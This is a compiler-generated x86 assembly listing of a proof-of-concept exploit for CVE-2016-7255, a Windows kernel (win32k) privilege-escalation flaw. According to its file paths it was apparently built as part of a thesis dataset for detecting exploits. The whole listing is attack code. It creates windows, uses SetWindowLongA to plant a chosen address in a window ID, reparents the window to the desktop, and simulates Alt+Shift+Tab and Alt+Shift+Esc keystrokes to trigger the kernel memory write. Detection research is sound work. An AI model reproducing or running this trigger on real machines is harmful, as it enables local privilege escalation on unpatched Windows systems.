; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	___local_stdio_printf_options
PUBLIC	__vsnprintf_l
PUBLIC	__vsnprintf
PUBLIC	_DbgPrint
PUBLIC	__sim_key_down
PUBLIC	__sim_key_up
PUBLIC	__sim_alt_shift_esc
PUBLIC	__sim_alt_shift_tab
PUBLIC	_or_address_value_4
PUBLIC	_wmain
EXTRN	_memset:PROC
EXTRN	__imp__DebugBreak@0:PROC
EXTRN	__imp__OutputDebugStringA@4:PROC
EXTRN	__imp__HeapAlloc@12:PROC
EXTRN	__imp__HeapFree@12:PROC
EXTRN	__imp__GetProcessHeap@0:PROC
EXTRN	__imp__Sleep@4:PROC
EXTRN	__imp__GetModuleHandleW@4:PROC
EXTRN	__imp__GetMessageA@16:PROC
EXTRN	__imp__TranslateMessage@4:PROC
EXTRN	__imp__DispatchMessageA@4:PROC
EXTRN	__imp__DefWindowProcW@16:PROC
EXTRN	__imp__UnregisterClassW@8:PROC
EXTRN	__imp__RegisterClassExW@4:PROC
EXTRN	__imp__CreateWindowExW@48:PROC
EXTRN	__imp__DestroyWindow@4:PROC
EXTRN	__imp__ShowWindow@8:PROC
EXTRN	__imp__SendInput@12:PROC
EXTRN	__imp__SwitchToThisWindow@8:PROC
EXTRN	__imp__SetForegroundWindow@4:PROC
EXTRN	__imp__SetWindowLongA@12:PROC
EXTRN	__imp__GetDesktopWindow@0:PROC
EXTRN	__imp__SetParent@8:PROC
EXTRN	___stdio_common_vsprintf:PROC
EXTRN	_DbgPrintEx:PROC
EXTRN	_memset:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG99198 DB	'c', 00H, 'v', 00H, 'e', 00H, '-', 00H, '2', 00H, '0', 00H
	DB	'1', 00H, '6', 00H, '-', 00H, '7', 00H, '2', 00H, '5', 00H, '5'
	DB	00H, 00H, 00H
$SG99199 DB	'c', 00H, 'v', 00H, 'e', 00H, '-', 00H, '2', 00H, '0', 00H
	DB	'1', 00H, '6', 00H, '-', 00H, '7', 00H, '2', 00H, '5', 00H, '5'
	DB	00H, 00H, 00H
$SG99203 DB	'hWndChild = 0x%p', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_nArgc$ = 8						; size = 4
_Argv$ = 12						; size = 4
_wmain	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255.c
; Line 276
	push	ebp
	mov	ebp, esp
$LN4@wmain:
; Line 279
	push	-1
	call	_or_address_value_4
	add	esp, 4
; Line 280
	xor	eax, eax
	jne	SHORT $LN4@wmain
; Line 282
	xor	eax, eax
; Line 283
	pop	ebp
	ret	0
_wmain	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stWC$ = -96						; size = 48
_stMsg$ = -48						; size = 28
_pszTitleName$ = -20					; size = 4
_pId$ = -16						; size = 4
_pszClassName$ = -12					; size = 4
_hWndParent$ = -8					; size = 4
_hWndChild$ = -4					; size = 4
_pAddress$ = 8						; size = 4
_or_address_value_4 PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255.c
; Line 161
	push	ebp
	mov	ebp, esp
	sub	esp, 96					; 00000060H
; Line 162
	push	48					; 00000030H
	push	0
	lea	eax, DWORD PTR _stWC$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 164
	mov	DWORD PTR _hWndParent$[ebp], 0
; Line 165
	mov	DWORD PTR _hWndChild$[ebp], 0
; Line 167
	mov	DWORD PTR _pszClassName$[ebp], OFFSET $SG99198
; Line 168
	mov	DWORD PTR _pszTitleName$[ebp], OFFSET $SG99199
; Line 170
	mov	DWORD PTR _pId$[ebp], 0
; Line 171
	xor	ecx, ecx
	mov	DWORD PTR _stMsg$[ebp], ecx
	mov	DWORD PTR _stMsg$[ebp+4], ecx
	mov	DWORD PTR _stMsg$[ebp+8], ecx
	mov	DWORD PTR _stMsg$[ebp+12], ecx
	mov	DWORD PTR _stMsg$[ebp+16], ecx
	mov	DWORD PTR _stMsg$[ebp+20], ecx
	mov	DWORD PTR _stMsg$[ebp+24], ecx
$LN4@or_address:
; Line 176
	mov	DWORD PTR _stWC$[ebp], 48		; 00000030H
; Line 177
	mov	edx, DWORD PTR __imp__DefWindowProcW@16
	mov	DWORD PTR _stWC$[ebp+8], edx
; Line 178
	mov	eax, DWORD PTR _pszClassName$[ebp]
	mov	DWORD PTR _stWC$[ebp+40], eax
; Line 180
	lea	ecx, DWORD PTR _stWC$[ebp]
	push	ecx
	call	DWORD PTR __imp__RegisterClassExW@4
	movzx	edx, ax
	test	edx, edx
	jne	SHORT $LN7@or_address
; Line 182
	jmp	$LN3@or_address
$LN7@or_address:
; Line 185
	push	0
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	push	0
	push	0
	push	360					; 00000168H
	push	360					; 00000168H
	push	0
	push	0
	push	282001408				; 10cf0000H
	push	0
	mov	eax, DWORD PTR _pszClassName$[ebp]
	push	eax
	push	0
	call	DWORD PTR __imp__CreateWindowExW@48
	mov	DWORD PTR _hWndParent$[ebp], eax
; Line 200
	cmp	DWORD PTR _hWndParent$[ebp], 0
	jne	SHORT $LN8@or_address
; Line 202
	jmp	$LN3@or_address
$LN8@or_address:
; Line 205
	push	0
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	push	0
	mov	ecx, DWORD PTR _hWndParent$[ebp]
	push	ecx
	push	160					; 000000a0H
	push	160					; 000000a0H
	push	0
	push	0
	push	1355743232				; 50cf0000H
	mov	edx, DWORD PTR _pszTitleName$[ebp]
	push	edx
	mov	eax, DWORD PTR _pszClassName$[ebp]
	push	eax
	push	0
	call	DWORD PTR __imp__CreateWindowExW@48
	mov	DWORD PTR _hWndChild$[ebp], eax
; Line 220
	cmp	DWORD PTR _hWndChild$[ebp], 0
	jne	SHORT $LN9@or_address
; Line 222
	jmp	$LN3@or_address
$LN9@or_address:
; Line 228
	mov	ecx, DWORD PTR _pAddress$[ebp]
	sub	ecx, 20					; 00000014H
	mov	DWORD PTR _pId$[ebp], ecx
; Line 231
	mov	edx, DWORD PTR _pId$[ebp]
	push	edx
	push	-12					; fffffff4H
	mov	eax, DWORD PTR _hWndChild$[ebp]
	push	eax
	call	DWORD PTR __imp__SetWindowLongA@12
; Line 233
	mov	ecx, DWORD PTR _hWndChild$[ebp]
	push	ecx
	push	OFFSET $SG99203
	call	_DbgPrint
	add	esp, 8
; Line 234
	call	DWORD PTR __imp__DebugBreak@0
; Line 236
	push	1
	mov	edx, DWORD PTR _hWndParent$[ebp]
	push	edx
	call	DWORD PTR __imp__ShowWindow@8
; Line 238
	call	DWORD PTR __imp__GetDesktopWindow@0
	push	eax
	mov	eax, DWORD PTR _hWndChild$[ebp]
	push	eax
	call	DWORD PTR __imp__SetParent@8
; Line 240
	mov	ecx, DWORD PTR _hWndChild$[ebp]
	push	ecx
	call	DWORD PTR __imp__SetForegroundWindow@4
; Line 242
	push	4
	call	__sim_alt_shift_tab
	add	esp, 4
; Line 244
	push	1
	mov	edx, DWORD PTR _hWndChild$[ebp]
	push	edx
	call	DWORD PTR __imp__SwitchToThisWindow@8
; Line 246
	call	__sim_alt_shift_esc
$LN5@or_address:
; Line 249
	push	0
	push	0
	push	0
	lea	eax, DWORD PTR _stMsg$[ebp]
	push	eax
	call	DWORD PTR __imp__GetMessageA@16
	test	eax, eax
	je	SHORT $LN2@or_address
; Line 251
	lea	ecx, DWORD PTR _stMsg$[ebp]
	push	ecx
	call	DWORD PTR __imp__TranslateMessage@4
; Line 252
	lea	edx, DWORD PTR _stMsg$[ebp]
	push	edx
	call	DWORD PTR __imp__DispatchMessageA@4
; Line 253
	jmp	SHORT $LN5@or_address
$LN2@or_address:
; Line 256
	xor	eax, eax
	jne	$LN4@or_address
$LN3@or_address:
; Line 258
	cmp	DWORD PTR _hWndParent$[ebp], 0
	je	SHORT $LN10@or_address
; Line 260
	mov	ecx, DWORD PTR _hWndParent$[ebp]
	push	ecx
	call	DWORD PTR __imp__DestroyWindow@4
; Line 261
	mov	DWORD PTR _hWndParent$[ebp], 0
$LN10@or_address:
; Line 264
	cmp	DWORD PTR _hWndChild$[ebp], 0
	je	SHORT $LN11@or_address
; Line 266
	mov	edx, DWORD PTR _hWndChild$[ebp]
	push	edx
	call	DWORD PTR __imp__DestroyWindow@4
; Line 267
	mov	DWORD PTR _hWndChild$[ebp], 0
$LN11@or_address:
; Line 270
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	mov	eax, DWORD PTR _pszClassName$[ebp]
	push	eax
	call	DWORD PTR __imp__UnregisterClassW@8
; Line 272
	xor	eax, eax
; Line 273
	mov	esp, ebp
	pop	ebp
	ret	0
_or_address_value_4 ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_hWnd$ = -12						; size = 4
_nFinalRet$ = -8					; size = 4
_i$ = -4						; size = 4
_nCount$ = 8						; size = 4
__sim_alt_shift_tab PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255.c
; Line 128
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 129
	mov	DWORD PTR _i$[ebp], 0
; Line 130
	mov	DWORD PTR _hWnd$[ebp], 0
; Line 133
	mov	DWORD PTR _nFinalRet$[ebp], -1
$LN4@sim_alt_sh:
; Line 137
	push	18					; 00000012H
	call	__sim_key_down
	add	esp, 4
; Line 138
	push	16					; 00000010H
	call	__sim_key_down
	add	esp, 4
; Line 141
	mov	DWORD PTR _i$[ebp], 0
	jmp	SHORT $LN7@sim_alt_sh
$LN5@sim_alt_sh:
	mov	eax, DWORD PTR _i$[ebp]
	add	eax, 1
	mov	DWORD PTR _i$[ebp], eax
$LN7@sim_alt_sh:
	mov	ecx, DWORD PTR _i$[ebp]
	cmp	ecx, DWORD PTR _nCount$[ebp]
	jge	SHORT $LN6@sim_alt_sh
; Line 143
	push	9
	call	__sim_key_down
	add	esp, 4
; Line 144
	push	9
	call	__sim_key_up
	add	esp, 4
; Line 146
	push	1000					; 000003e8H
	call	DWORD PTR __imp__Sleep@4
; Line 148
	jmp	SHORT $LN5@sim_alt_sh
$LN6@sim_alt_sh:
; Line 151
	push	18					; 00000012H
	call	__sim_key_up
	add	esp, 4
; Line 152
	push	16					; 00000010H
	call	__sim_key_up
	add	esp, 4
; Line 153
	xor	edx, edx
	jne	SHORT $LN4@sim_alt_sh
; Line 155
	mov	eax, DWORD PTR _nFinalRet$[ebp]
; Line 156
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_alt_shift_tab ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_i$ = -4						; size = 4
__sim_alt_shift_esc PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255.c
; Line 101
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 102
	mov	DWORD PTR _i$[ebp], 0
$LN4@sim_alt_sh:
; Line 106
	push	18					; 00000012H
	call	__sim_key_down
	add	esp, 4
; Line 107
	push	16					; 00000010H
	call	__sim_key_down
	add	esp, 4
; Line 110
	push	27					; 0000001bH
	call	__sim_key_down
	add	esp, 4
; Line 111
	push	27					; 0000001bH
	call	__sim_key_up
	add	esp, 4
; Line 113
	push	27					; 0000001bH
	call	__sim_key_down
	add	esp, 4
; Line 114
	push	27					; 0000001bH
	call	__sim_key_up
	add	esp, 4
; Line 116
	push	18					; 00000012H
	call	__sim_key_up
	add	esp, 4
; Line 117
	push	16					; 00000010H
	call	__sim_key_up
	add	esp, 4
; Line 120
	xor	eax, eax
	jne	SHORT $LN4@sim_alt_sh
; Line 122
	xor	eax, eax
; Line 123
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_alt_shift_esc ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stInput$ = -28						; size = 28
_wKey$ = 8						; size = 2
__sim_key_up PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255.c
; Line 84
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
; Line 85
	xor	eax, eax
	mov	DWORD PTR _stInput$[ebp], eax
	mov	DWORD PTR _stInput$[ebp+4], eax
	mov	DWORD PTR _stInput$[ebp+8], eax
	mov	DWORD PTR _stInput$[ebp+12], eax
	mov	DWORD PTR _stInput$[ebp+16], eax
	mov	DWORD PTR _stInput$[ebp+20], eax
	mov	DWORD PTR _stInput$[ebp+24], eax
$LN4@sim_key_up:
; Line 89
	mov	DWORD PTR _stInput$[ebp], 1
; Line 90
	mov	cx, WORD PTR _wKey$[ebp]
	mov	WORD PTR _stInput$[ebp+4], cx
; Line 91
	mov	DWORD PTR _stInput$[ebp+8], 2
; Line 93
	push	28					; 0000001cH
	lea	edx, DWORD PTR _stInput$[ebp]
	push	edx
	push	1
	call	DWORD PTR __imp__SendInput@12
; Line 95
	xor	eax, eax
	jne	SHORT $LN4@sim_key_up
; Line 97
	xor	eax, eax
; Line 98
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_key_up ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stInput$ = -28						; size = 28
_wKey$ = 8						; size = 2
__sim_key_down PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255.c
; Line 67
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
; Line 68
	xor	eax, eax
	mov	DWORD PTR _stInput$[ebp], eax
	mov	DWORD PTR _stInput$[ebp+4], eax
	mov	DWORD PTR _stInput$[ebp+8], eax
	mov	DWORD PTR _stInput$[ebp+12], eax
	mov	DWORD PTR _stInput$[ebp+16], eax
	mov	DWORD PTR _stInput$[ebp+20], eax
	mov	DWORD PTR _stInput$[ebp+24], eax
$LN4@sim_key_do:
; Line 72
	mov	DWORD PTR _stInput$[ebp], 1
; Line 73
	mov	cx, WORD PTR _wKey$[ebp]
	mov	WORD PTR _stInput$[ebp+4], cx
; Line 74
	mov	DWORD PTR _stInput$[ebp+8], 0
; Line 76
	push	28					; 0000001cH
	lea	edx, DWORD PTR _stInput$[ebp]
	push	edx
	push	1
	call	DWORD PTR __imp__SendInput@12
; Line 78
	xor	eax, eax
	jne	SHORT $LN4@sim_key_do
; Line 80
	xor	eax, eax
; Line 81
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_key_down ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_ulRet$ = -12						; size = 4
_VaList$ = -8						; size = 4
_pszDbgBuff$ = -4					; size = 4
_Format$ = 8						; size = 4
_DbgPrint PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255.c
; Line 31
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 32
	mov	DWORD PTR _pszDbgBuff$[ebp], 0
; Line 33
	mov	DWORD PTR _VaList$[ebp], 0
; Line 34
	mov	DWORD PTR _ulRet$[ebp], 0
$LN4@DbgPrint:
; Line 38
	push	1024					; 00000400H
	push	0
	call	DWORD PTR __imp__GetProcessHeap@0
	push	eax
	call	DWORD PTR __imp__HeapAlloc@12
	mov	DWORD PTR _pszDbgBuff$[ebp], eax
; Line 39
	cmp	DWORD PTR _pszDbgBuff$[ebp], 0
	jne	SHORT $LN5@DbgPrint
; Line 41
	jmp	SHORT $LN3@DbgPrint
$LN5@DbgPrint:
; Line 43
	push	1024					; 00000400H
	push	0
	mov	eax, DWORD PTR _pszDbgBuff$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 45
	lea	ecx, DWORD PTR _Format$[ebp+4]
	mov	DWORD PTR _VaList$[ebp], ecx
; Line 47
	mov	edx, DWORD PTR _VaList$[ebp]
	push	edx
	mov	eax, DWORD PTR _Format$[ebp]
	push	eax
	push	1023					; 000003ffH
	mov	ecx, DWORD PTR _pszDbgBuff$[ebp]
	push	ecx
	call	__vsnprintf
	add	esp, 16					; 00000010H
; Line 49
	mov	edx, DWORD PTR _pszDbgBuff$[ebp]
	push	edx
	push	0
	push	77					; 0000004dH
	call	_DbgPrintEx
	add	esp, 12					; 0000000cH
; Line 50
	mov	eax, DWORD PTR _pszDbgBuff$[ebp]
	push	eax
	call	DWORD PTR __imp__OutputDebugStringA@4
; Line 52
	mov	DWORD PTR _VaList$[ebp], 0
; Line 54
	xor	ecx, ecx
	jne	SHORT $LN4@DbgPrint
$LN3@DbgPrint:
; Line 56
	cmp	DWORD PTR _pszDbgBuff$[ebp], 0
	je	SHORT $LN6@DbgPrint
; Line 58
	mov	edx, DWORD PTR _pszDbgBuff$[ebp]
	push	edx
	push	0
	call	DWORD PTR __imp__GetProcessHeap@0
	push	eax
	call	DWORD PTR __imp__HeapFree@12
; Line 59
	mov	DWORD PTR _pszDbgBuff$[ebp], 0
$LN6@DbgPrint:
; Line 62
	mov	eax, DWORD PTR _ulRet$[ebp]
; Line 63
	mov	esp, ebp
	pop	ebp
	ret	0
_DbgPrint ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vsnprintf
_TEXT	SEGMENT
__Buffer$ = 8						; size = 4
__BufferCount$ = 12					; size = 4
__Format$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vsnprintf PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1411
	push	ebp
	mov	ebp, esp
; Line 1412
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	push	0
	mov	ecx, DWORD PTR __Format$[ebp]
	push	ecx
	mov	edx, DWORD PTR __BufferCount$[ebp]
	push	edx
	mov	eax, DWORD PTR __Buffer$[ebp]
	push	eax
	call	__vsnprintf_l
	add	esp, 20					; 00000014H
; Line 1413
	pop	ebp
	ret	0
__vsnprintf ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vsnprintf_l
_TEXT	SEGMENT
tv74 = -8						; size = 4
__Result$ = -4						; size = 4
__Buffer$ = 8						; size = 4
__BufferCount$ = 12					; size = 4
__Format$ = 16						; size = 4
__Locale$ = 20						; size = 4
__ArgList$ = 24						; size = 4
__vsnprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1391
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 1392
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __BufferCount$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Buffer$[ebp]
	push	ecx
	call	___local_stdio_printf_options
	mov	edx, DWORD PTR [eax]
	or	edx, 1
	mov	eax, DWORD PTR [eax+4]
	push	eax
	push	edx
	call	___stdio_common_vsprintf
	add	esp, 28					; 0000001cH
	mov	DWORD PTR __Result$[ebp], eax
; Line 1396
	cmp	DWORD PTR __Result$[ebp], 0
	jge	SHORT $LN3@vsnprintf_
	mov	DWORD PTR tv74[ebp], -1
	jmp	SHORT $LN4@vsnprintf_
$LN3@vsnprintf_:
	mov	ecx, DWORD PTR __Result$[ebp]
	mov	DWORD PTR tv74[ebp], ecx
$LN4@vsnprintf_:
	mov	eax, DWORD PTR tv74[ebp]
; Line 1397
	mov	esp, ebp
	pop	ebp
	ret	0
__vsnprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
